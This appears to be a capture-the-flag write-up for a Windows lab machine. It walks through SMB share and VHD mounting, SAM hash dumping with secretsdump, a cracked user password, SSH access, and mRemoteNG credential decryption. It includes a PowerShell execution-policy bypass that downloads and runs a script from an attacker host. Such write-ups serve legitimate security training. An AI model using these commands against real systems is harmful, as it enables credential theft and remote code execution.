![image](https://user-images.githubusercontent.com/68326057/117133594-14d9a280-adc2-11eb-8de2-a7e5f562c1d3.png)

# NMAP

```bash

PORT      STATE SERVICE      VERSION

22/tcp    open  ssh          OpenSSH for_Windows_7.9 (protocol 2.0)
| ssh-hostkey: 
|   2048 3a:56:ae:75:3c:78:0e:c8:56:4d:cb:1c:22:bf:45:8a (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC3bG3TRRwV6dlU1lPbviOW+3fBC7wab+KSQ0Gyhvf9Z1OxFh9v5e6GP4rt5Ss76ic1oAJPIDvQwGlKdeUEnjtEtQXB/78Ptw6IPPPPwF5dI1W4GvoGR4MV5Q6CPpJ6HLIJdvAcn3isTCZgoJT69xRK0ymPnqUqaB+/ptC4xvHmW9ptHdYjDOFLlwxg17e7Sy0CA67PW/nXu7+OKaIOx0lLn8QPEcyrYVCWAqVcUsgNNAjR4h1G7tYLVg3SGrbSmIcxlhSMexIFIVfR37LFlNIYc6Pa58lj2MSQLusIzRoQxaXO4YSp/dM1tk7CN2cKx1PTd9VVSDH+/Nq0HCXPiYh3
|   256 cc:2e:56:ab:19:97:d5:bb:03:fb:82:cd:63:da:68:01 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBF1Mau7cS9INLBOXVd4TXFX/02+0gYbMoFzIayeYeEOAcFQrAXa1nxhHjhfpHXWEj2u0Z/hfPBzOLBGi/ngFRUg=
|   256 93:5f:5d:aa:ca:9f:53:e7:f2:82:e6:64:a8:a3:a0:18 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIB34X2ZgGpYNXYb+KLFENmf0P0iQ22Q0sjws2ATjFsiN

135/tcp   open  msrpc        Microsoft Windows RPC

139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn

445/tcp   open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds

5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found

47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found

49664/tcp open  msrpc        Microsoft Windows RPC
49665/tcp open  msrpc        Microsoft Windows RPC
49666/tcp open  msrpc        Microsoft Windows RPC
49667/tcp open  msrpc        Microsoft Windows RPC
49668/tcp open  msrpc        Microsoft Windows RPC
49669/tcp open  msrpc        Microsoft Windows RPC
49670/tcp open  msrpc        Microsoft Windows RPC
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows
```

# SMB

![image](https://user-images.githubusercontent.com/68326057/117143063-08f3dd80-adce-11eb-9269-ebea3c9fc440.png)

![image](https://user-images.githubusercontent.com/68326057/117143108-14470900-adce-11eb-8e97-c3cfb1b5fa77.png)

```bash
cat note.txt 
Sysadmins: please don't transfer the entire backup file locally, the VPN to the subsidiary office is too slow.
```

## Mount 

1. Mount thesmb share as:-
```bash
sudo mount -t cifs //10.10.10.134/Backups /tmp/smb
And press Enter for password
```
![image](https://user-images.githubusercontent.com/68326057/117148290-ba494200-add3-11eb-8013-3f084b5b49d4.png)

```bash
guestmount --add 9b9cfbc4-369e-11e9-a17c-806e6f6e6963.vhd  --inspector --ro -v /tmp/windows
```

--> all hashes are for users are stored in /windows/system32/config SAM and SYSTEM .

## Creds Dump
```
impacket-secretsdump -sam SAM -system SYSTEM local
```

```bash
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
                                                    ^
                                                  (31d6)This is call null or maybe there is no User
                                                  
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
                                               ^
                                               Same as above.

L4mpje:1000:aad3b435b51404eeaad3b435b51404ee:26112010952d963c8dc4217daec986d9:::

```

![image](https://user-images.githubusercontent.com/68326057/117150157-853def00-add5-11eb-8d6f-06f07146125e.png)

```bash
L4mpje:bureaulampje
```


# ssh
```bash
ssh L4mpje@IP
```

![image](https://user-images.githubusercontent.com/68326057/117150402-c0402280-add5-11eb-95a1-2135ba10f7f1.png)

![image](https://user-images.githubusercontent.com/68326057/117150446-c930f400-add5-11eb-85ad-1f79e0fe08c7.png)


```powershell
powershell -ep bypass
IEX(New-Object Net.WebClient).downloadString('http://10.10.14.21:8000/jaws-enum.ps1') 
```

# mremoteng

--> https://github.com/haseebT/mRemoteNG-Decrypt.git

--> config file for users  are stored in APPDATA in /users (windows)

![image](https://user-images.githubusercontent.com/68326057/117155357-56764780-adda-11eb-8856-bc7c5ad838e6.png)

![image](https://user-images.githubusercontent.com/68326057/117155797-b66cee00-adda-11eb-9a3b-5780a68ec831.png)


```bash
python3 mremoteng_decrypt.py -s aEWNFV5uGcjUHF0uS17QTdT9kVqtKCPeoC0Nw5dmaPFjNQ2kt/zO5xDqE4HdVmHAowVRdC7emf7lWWA10dQKiw==
```

![image](https://user-images.githubusercontent.com/68326057/117156092-f7fd9900-adda-11eb-8045-d1a1bcaf2557.png)

